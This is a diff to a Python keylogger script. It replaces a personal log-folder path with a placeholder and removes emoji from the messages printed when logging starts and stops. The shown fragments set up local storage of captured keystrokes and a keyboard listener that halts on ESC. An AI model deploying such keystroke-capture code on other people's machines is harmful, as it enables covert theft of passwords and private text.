@@ -3,7 +3,7 @@ from datetime import datetime
 import os
 
 # Set custom save path
-log_directory = r"C:\Users\ranek\OneDrive\Desktop\Hello World\key_logger"
+log_directory = r"YOUR PATH" #If you dont know how to find the path where you will save your keylogger use this guide https://www.sony.com/electronics/support/articles/00015251 
 log_file = os.path.join(log_directory, "keylog.txt")
 
 # Create directory if it doesn't exist
@@ -46,10 +46,10 @@ def on_press(key):
 # Stop listener on ESC
 def on_release(key):
     if key == keyboard.Key.esc:
-        print("🔴 ESC pressed — stopping keylogger.")
+        print("ESC pressed — stopping keylogger.")
         return False
 
 # Start keylogger
-print("🟢 Keylogger started. Press ESC to stop.\n")
+print("Keylogger started. Press ESC to stop.\n")
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
